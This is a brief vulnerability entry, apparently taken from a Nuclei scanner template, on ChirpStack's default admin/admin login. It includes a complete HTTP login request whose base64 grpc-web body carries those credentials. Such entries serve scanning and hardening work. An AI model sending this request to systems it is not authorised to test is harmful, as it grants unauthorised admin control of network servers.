# Vulnerability: ChirpStack - Default Login
**Classification:** CWE-1392
**Source:** Nuclei Template (`chirpstack-default-login.yaml`)

## Description
Fresh ChirpStack installations use the default credentials (admin/admin), allowing attackers to easily access the admin console.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api.InternalService/Login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/grpc-web-text
Accept: application/grpc-web-text

AAAAAA4KBWFkbWluEgVhZG1pbg==
```

